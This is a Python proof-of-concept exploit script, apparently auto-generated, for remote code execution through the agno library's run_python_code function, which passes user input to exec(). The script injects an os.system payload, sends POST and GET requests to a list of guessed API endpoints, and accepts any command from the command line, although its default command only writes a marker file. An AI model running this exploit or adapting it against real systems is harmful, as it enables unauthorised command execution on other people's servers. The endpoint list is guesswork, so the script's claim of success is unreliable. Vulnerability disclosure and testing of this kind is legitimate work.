#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: rce-012
# Sink: run_python_code
# Auto-generated — run with: python3 rce_python_code_leading_rce_run_python_code.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in agno's run_python_code function.
The function directly calls exec() on the 'code' parameter without sanitization.
"""

import requests
import sys
import time
import json

# Configuration
TARGET_URL = "http://localhost:8000"  # Change this to the target URL
TIMEOUT = 10

def exploit_rce(target_url, command="touch /tmp/poc_success.txt"):
    """
    Exploit the RCE vulnerability in run_python_code.
    
    The vulnerability exists because exec() is called directly on user-supplied code
    without any sanitization or sandboxing. Even if safe_globals/safe_locals are used,
    we can still access dangerous functions through builtins.
    """
    
    # Craft a payload that executes our command
    # We use __import__ to get os module and execute the command
    payload = f"""
import os
os.system("{command}")
result = "Command executed successfully"
"""
    
    # The function expects a JSON payload with 'code' parameter
    # Adjust the endpoint and parameter names based on actual API
    exploit_data = {
        "code": payload,
        "variable_to_return": "result"
    }
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Command to execute: {command}")
    print(f"[*] Payload: {payload.strip()}")
    
    try:
        # Try common API endpoints
        endpoints = [
            "/api/run-python",
            "/api/run_python_code",
            "/api/execute",
            "/api/code/run",
            "/v1/run-python",
            "/v1/run_python_code",
        ]
        
        for endpoint in endpoints:
            url = f"{target_url}{endpoint}"
            print(f"\n[*] Trying endpoint: {endpoint}")
            
            try:
                response = requests.post(
                    url,
                    json=exploit_data,
                    timeout=TIMEOUT,
                    headers={"Content-Type": "application/json"}
                )
                
                print(f"[*] Status: {response.status_code}")
                print(f"[*] Response: {response.text[:500]}")
                
                if response.status_code == 200:
                    print("[+] Success! Command executed.")
                    return True
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] Request failed: {e}")
                continue
        
        # If direct API calls fail, try alternative approaches
        print("\n[*] Trying alternative approaches...")
        
        # Try GET parameters
        for endpoint in endpoints:
            url = f"{target_url}{endpoint}?code={requests.utils.quote(payload)}"
            try:
                response = requests.get(url, timeout=TIMEOUT)
                print(f"[*] GET {endpoint}: Status {response.status_code}")
                if response.status_code == 200:
                    print("[+] Success via GET!")
                    return True
            except:
                continue
        
        print("\n[-] Could not find working endpoint")
        return False
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def main():
    """Main function with configurable target."""
    
    # Parse command line arguments if provided
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_URL
    
    # Use a benign command by default
    command = "echo 'POC_SUCCESS' > /tmp/poc_success.txt"
    
    if len(sys.argv) > 2:
        command = sys.argv[2]
    
    print("=" * 60)
    print("Agno RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print(f"\n[*] Target: {target}")
    print(f"[*] Command: {command}")
    print("\n[*] Starting exploit...")
    
    success = exploit_rce(target, command)
    
    if success:
        print("\n[+] Exploit completed successfully!")
        print("[*] Check /tmp/poc_success.txt for evidence")
    else:
        print("\n[-] Exploit failed")
        print("[*] Try adjusting the target URL or API endpoint")
        sys.exit(1)

if __name__ == "__main__":
    main()
